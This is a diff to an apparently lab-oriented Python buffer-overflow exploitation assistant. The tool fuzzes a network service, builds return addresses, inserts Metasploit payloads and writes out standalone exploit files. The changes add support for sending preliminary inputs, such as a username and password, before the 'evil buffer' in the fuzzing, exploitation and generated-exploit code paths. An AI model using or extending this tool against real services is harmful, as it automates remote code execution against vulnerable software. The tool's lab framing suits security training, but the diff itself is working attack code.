@@ -68,7 +68,7 @@ ______  ___________         ___          _     _              _
     print("You can follow Pakcyberbot on his social media platforms for more informative materials.\nAll SocialMedia links can be found here:",
           RED+"https://tryhackme.com/p/PakCyberbot", END)
 
-    print('\n\n NOTE: You can also modify the program_input_handling() packet sending block according to your Target Program Input Behaviour')
+    # print('\n\n NOTE: You can also modify the program_input_handling() packet sending block according to your Target Program Input Behaviour')
 
     print("\n\nLet's start doing Buffer-Overflow. \nStart your Vulnerable application on other machine in the Immunity Debugger and also setup Mona in it.")
     input("(Press Enter to Continue)\n")
@@ -83,11 +83,35 @@ ______  ___________         ___          _     _              _
     prefix = input(
         BLUE+"If there is any prefix with the input then type it else Leave empty : "+END)
 
+    global prevs_ar
+    prevs_ar = []
+    prev = input(
+        BLUE+"You can send other inputs the vulnerable one (e.g username and password).\r\nInsert the first input, leave it empty to terminate: "+END)
+
+    while prev != "":
+        prevs_ar.append(prev)
+        prev = input(
+            BLUE+"If needed add another input, leave it empty to terminate: "+END)
+
+    if prevs_ar:
+        print('You entered the following inputs: ' + ', '.join(prevs_ar))
+        res_c = input(
+            BLUE+"Is it correct? Insert N to wipe them: "+END).strip()
+        if res_c == "N":
+            prevs_ar.clear()
+
 ########################################### ------ MODIFY ACCORDING TO PROGRAM INPUT ------###########################################
 
 
 def program_input_handling(s, buffer):
     s.send(bytes(buffer+'\\r\\n', "latin-1"))
+
+
+def program_input_handling_prev(s):
+
+    for pi in prevs_ar:
+        s.send(bytes(pi+'\\r\\n', "latin-1"))
+        s.recv(1024)
 
 ########################################### ------ FUZZING ------###########################################
 
@@ -153,9 +177,9 @@ Do you want to do?\n
                 print("Fuzzing with {} bytes".format(
                     len(string) - len(prefix)))
 
-                program_input_handling(s, string)
+                program_input_handling_prev(s)
 
-                # s.send(bytes(string+'\r\n', "latin-1"))
+                program_input_handling(s, string)
                 s.recv(1024)
         except:
             print("Fuzzing crashed at {} bytes".format(
@@ -215,6 +239,8 @@ def exploit():
             s.connect((ip, port))
 
             print("Sending evil buffer...")
+
+            program_input_handling_prev(s)
 
             program_input_handling(s, buffer)
 
@@ -317,7 +343,7 @@ def exploit():
             retn = "\\x" + ("\\x".join(ar))
 
             retn = retn.encode('utf-8').decode('unicode_escape')
-         
+
             print(H_exploitatoin)
 
             payload = MSF_payloads(badchars)
@@ -351,7 +377,7 @@ def exploit():
                 generate_exploit_file(buffer, LPORT)
             input("(Press Enter to Continue)\n")
             sys.exit()
-            
+
 
 ########################################### ------ DIRECT EXPLOITATION ------###########################################
 
@@ -397,6 +423,8 @@ def direct_exploit():
         s.connect((ip, port))
         print("Sending evil buffer...")
 
+        program_input_handling_prev(s)
+
         program_input_handling(s, buffer)
 
         # s.send(bytes(buffer + "\r\n", "latin-1"))
@@ -419,6 +447,8 @@ def generate_exploit_file(exploit_payload, LPORT):
 import sys,socket
 import pyperclip
 {getsource(program_input_handling)}
+{getsource(program_input_handling_prev)}
+prevs_ar = {prevs_ar}
 if len(sys.argv) == 3:
     buffer = {exploit_payload.encode('latin-1')}
     buffer = buffer.decode('unicode_escape')
@@ -439,6 +469,8 @@ if len(sys.argv) == 3:
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             s.connect((ip, port))
             print("Sending evil buffer...")
+            
+            program_input_handling_prev(s)
             
             program_input_handling(s,buffer)
             
@@ -600,4 +632,4 @@ if __name__ == "__main__":
 
         print('python3 BOF-Assistant.py <IP> <PORT> [-e/--exploit]')
         print('\n-e/--exploit : to directly exploit the program if you know the values')
-        print('\n\n NOTE: You can also modify the program_input_handling() packet sending block according to your Target Program Input Behaviour')
+        # print('\n\n NOTE: You can also modify the program_input_handling() packet sending block according to your Target Program Input Behaviour')
